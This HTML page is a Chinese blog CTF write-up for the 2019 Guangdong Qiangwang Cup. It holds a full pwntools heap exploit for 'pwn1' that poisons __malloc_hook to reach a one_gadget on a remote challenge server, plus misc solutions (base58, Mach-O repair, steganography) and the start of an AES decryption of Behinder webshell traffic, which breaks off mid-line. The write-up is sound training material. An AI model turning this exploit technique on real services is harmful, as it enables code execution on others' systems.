<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">

<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="ctf,Pwn,Writeups,">










<meta name="description" content="Pwnpwn1 Run函数有个条件竞争，可以泄漏libc，后面libc换了2.27，所以条件竞争配合uaf写fd指针到__malloc_hook然后改为one_gadget即可   1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859">
<meta name="keywords" content="ctf,Pwn,Writeups">
<meta property="og:type" content="article">
<meta property="og:title" content="2019广东强网杯_wp">
<meta property="og:url" content="http://yoursite.com/2019/09/10/2019广东强网杯-wp/index.html">
<meta property="og:site_name" content="1mpossible">
<meta property="og:description" content="Pwnpwn1 Run函数有个条件竞争，可以泄漏libc，后面libc换了2.27，所以条件竞争配合uaf写fd指针到__malloc_hook然后改为one_gadget即可   1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-8ff10f6d7fadfb86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-e3dac7f2bc1d273d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-8b9d4c045e512ea0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-bab9937da663a289.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-7d23457839f6d936.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-0edd072cb4e1a07f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-0759a2a86740363d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-8cc67dd16375af9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-befc5885004ce98f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-a55db191c76d1a52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-b9e71406241dbf53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-44ed489c872a009e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-cafd59bb3fc62cd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-df5a40abeba320f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-efd53860a54ad4b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-77539fabecd65461.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-102d06539450eaf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-078bb08097cfb41b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-6b31e09b68b2a374.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-f146f0e56878980b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-1474d45a62503919.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-d89ec0d25cac4a3b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-f416446cd62a333a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-2ad7a71df704a39e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-4af6a1f8aac8288b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:updated_time" content="2019-09-10T10:34:40.063Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019广东强网杯_wp">
<meta name="twitter:description" content="Pwnpwn1 Run函数有个条件竞争，可以泄漏libc，后面libc换了2.27，所以条件竞争配合uaf写fd指针到__malloc_hook然后改为one_gadget即可   1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5808046-8ff10f6d7fadfb86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/09/10/2019广东强网杯-wp/">





  <title>2019广东强网杯_wp | 1mpossible</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?4e8a62468b73a2eaab4764496c434a66";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

<a href="https://github.com/hacker-mao" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">1mpossible</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/10/2019广东强网杯-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D4rk3r">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/head.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="1mpossible">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2019广东强网杯_wp</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-10T16:58:33+08:00">
                2019-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index">
                    <span itemprop="name">ctf</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/09/10/2019广东强网杯-wp/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/09/10/2019广东强网杯-wp/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/09/10/2019广东强网杯-wp/" class="leancloud_visitors" data-flag-title="2019广东强网杯_wp">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">热度&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
                 <span>℃</span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  24
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><ul>
<li>Run函数有个条件竞争，可以泄漏libc，后面libc换了2.27，所以条件竞争配合uaf写fd指针到__malloc_hook然后改为one_gadget即可</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-8ff10f6d7fadfb86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./pwn1&apos;)</span><br><span class="line">p = remote(&apos;119.61.19.212&apos;,8087)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">	p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line">def malloc(idx,cont):</span><br><span class="line">	ru(&apos;run\n&apos;)</span><br><span class="line">	sl(&apos;1&apos;)</span><br><span class="line">	ru(&apos;index:\n&apos;)</span><br><span class="line">	sl(str(idx))</span><br><span class="line">	ru(&apos;content:\n&apos;)</span><br><span class="line">	sl(cont)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">	ru(&apos;run\n&apos;)</span><br><span class="line">	sl(&apos;2&apos;)</span><br><span class="line">	ru(&apos;index:\n&apos;)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line">def run(idx,cont):</span><br><span class="line">	ru(&apos;run\n&apos;)</span><br><span class="line">	sl(&apos;3&apos;)</span><br><span class="line">	ru(&apos;index:\n&apos;)</span><br><span class="line">	sl(str(idx))</span><br><span class="line">	ru(&apos;key:\n&apos;)</span><br><span class="line">	se(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(0,&apos;aaa&apos;) #0</span><br><span class="line">malloc(1,&apos;bbb&apos;) #1</span><br><span class="line">malloc(2,&apos;ccc&apos;) #2</span><br><span class="line">malloc(3,&apos;ddd&apos;) #3</span><br><span class="line">malloc(4,&apos;eee&apos;) #4</span><br><span class="line">malloc(5,&apos;fff&apos;) #5</span><br><span class="line">malloc(6,&apos;666&apos;) </span><br><span class="line">malloc(7,&apos;777&apos;)</span><br><span class="line">malloc(8,&apos;888&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">	free(str(i))</span><br><span class="line"></span><br><span class="line">run(0,&apos;a&apos;*8)</span><br><span class="line">free(0)</span><br><span class="line">ru(&apos;run\n&apos;)</span><br><span class="line">leak_libc = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(&apos;leak libc : 0x%x&apos;%leak_libc)</span><br><span class="line">libc_base = leak_libc - 96 - 0x3ebc40</span><br><span class="line">info(&apos;libc base : 0x%x&apos;%libc_base)</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line">malloc_hook = libc_base + 0x3ebc30</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line">ru(&apos;index:\n&apos;)</span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line">ru(&apos;content:\n&apos;)</span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">	malloc(&apos;1&apos;,&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">run(1,&apos;a&apos;)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">ru(&apos;run\n&apos;)</span><br><span class="line">leak_heap = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(&apos;leak heap : 0x%x&apos;%leak_heap)</span><br><span class="line"></span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line">ru(&apos;index:\n&apos;)</span><br><span class="line">sl(&apos;2&apos;)</span><br><span class="line">ru(&apos;content:\n&apos;)</span><br><span class="line">sl(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">info(&apos;malloc hook : 0x%x&apos;%malloc_hook)</span><br><span class="line">run(2,str(malloc_hook^leak_heap))</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">sleep(2)</span><br><span class="line">malloc(5,&apos;a&apos;)</span><br><span class="line">malloc(6,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">ru(&apos;run\n&apos;)</span><br><span class="line">sl(&apos;1&apos;)</span><br><span class="line">ru(&apos;index:\n&apos;)</span><br><span class="line">sl(&apos;0&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="完美的错误"><a href="#完美的错误" class="headerlink" title="完美的错误"></a>完美的错误</h2><ul>
<li>题目描述去除混淆的编码，于是联想到base58，又说错位，所以改一下字符集顺序爆破</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__b58chars = &apos;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&apos;</span><br><span class="line">__b58base = len(__b58chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def b58encode(v):</span><br><span class="line">    &quot;&quot;&quot; encode v, which is a string of bytes, to base58.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    long_value = int(v.encode(&quot;hex_codec&quot;), 16)</span><br><span class="line"></span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    while long_value &gt;= __b58base:</span><br><span class="line">        div, mod = divmod(long_value, __b58base)</span><br><span class="line">        result = __b58chars[mod] + result</span><br><span class="line">        long_value = div</span><br><span class="line">    result = __b58chars[long_value] + result</span><br><span class="line"></span><br><span class="line">    # Bitcoin does a little leading-zero-compression:</span><br><span class="line">    # leading 0-bytes in the input become leading-1s</span><br><span class="line">    nPad = 0</span><br><span class="line">    for c in v:</span><br><span class="line">        if c == &apos;\0&apos;:</span><br><span class="line">            nPad += 1</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    return (__b58chars[0] * nPad) + result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def b58decode(v):</span><br><span class="line">    &quot;&quot;&quot; decode v into a string of len bytes</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    long_value = 0L</span><br><span class="line">    for (i, c) in enumerate(v[::-1]):</span><br><span class="line">        long_value += __b58chars.find(c) * (__b58base ** i)</span><br><span class="line"></span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    while long_value &gt;= 256:</span><br><span class="line">        div, mod = divmod(long_value, 256)</span><br><span class="line">        result = chr(mod) + result</span><br><span class="line">        long_value = div</span><br><span class="line">    result = chr(long_value) + result</span><br><span class="line"></span><br><span class="line">    nPad = 0</span><br><span class="line">    for c in v:</span><br><span class="line">        if c == __b58chars[0]:</span><br><span class="line">            nPad += 1</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    result = chr(0) * nPad + result</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def pailie(a):</span><br><span class="line">	aa = a[0]</span><br><span class="line">	bb = a[1:]+aa</span><br><span class="line">	return bb</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    for i in range(58):</span><br><span class="line">        __b58chars = pailie(__b58chars)</span><br><span class="line">        #print  b58encode(&quot;hello world&quot;)</span><br><span class="line">        print  b58decode(&quot;RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/5808046-e3dac7f2bc1d273d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h2><ul>
<li>题目是个图片，拿到以后发现文件头多了点东西，猜测是文件修复</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-8b9d4c045e512ea0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<ul>
<li>谷歌搜了一下<strong><em>__PAGEZERO</em></strong>，发现是Mach-O文件格式，具体可以看<a href="https://amywushu.github.io/2017/02/21/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E8%A7%A3%E8%AF%BB-Mach-O-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.html" target="_blank" rel="noopener">https://amywushu.github.io/2017/02/21/基础知识-解读-Mach-O-文件格式.html</a>，于是修复文件头，把<strong><em>0xffffffff</em></strong>改为<strong><em>0xcffaedfe</em></strong>，然后ida打开看，写个异或脚本</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-bab9937da663a289.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-7d23457839f6d936.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;938gce1`872db99db`b342d23c0g9g2d&apos;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in a:</span><br><span class="line">	b = chr(ord(i) ^ 1)</span><br><span class="line">	flag += b</span><br><span class="line"></span><br><span class="line">print &apos;flag&#123;&apos;+flag+&apos;&#125;&apos;</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/5808046-0edd072cb4e1a07f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="脑筋急转弯"><a href="#脑筋急转弯" class="headerlink" title="脑筋急转弯"></a>脑筋急转弯</h2><ul>
<li>拿到一个wav文件，猜测是wav隐写，最后用silenteye得到一个压缩包，爆破得到密码654321，然后打开压缩包有个txt</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-0759a2a86740363d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<ul>
<li>把<strong><em>012</em></strong>换成<strong><em>.!?</em></strong>，然后ook，brainfuck解码</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-8cc67dd16375af9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5808046-befc5885004ce98f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h2 id="抓灰阔"><a href="#抓灰阔" class="headerlink" title="抓灰阔"></a>抓灰阔</h2><ul>
<li>一个流量包，仔细找传输的文件，发现main.jsp，再上网找资料，发现是<a href="https://xz.aliyun.com/t/2799" target="_blank" rel="noopener">冰蝎一句话木马</a>，所以目前key和加密的payload有了，逐一解密payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line"> </span><br><span class="line">key = &apos;ba4ae3277932b0a2&apos;</span><br><span class="line"> </span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"> </span><br><span class="line">#print(msg.encode(&quot;hex&quot;))</span><br><span class="line">f= open(&apos;./data/flag.enc&apos;,&apos;rb&apos;)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">msg = data.decode(&apos;base64&apos;)</span><br><span class="line">#msg = data</span><br><span class="line">decipher = AES.new(key, AES.MODE_ECB)</span><br><span 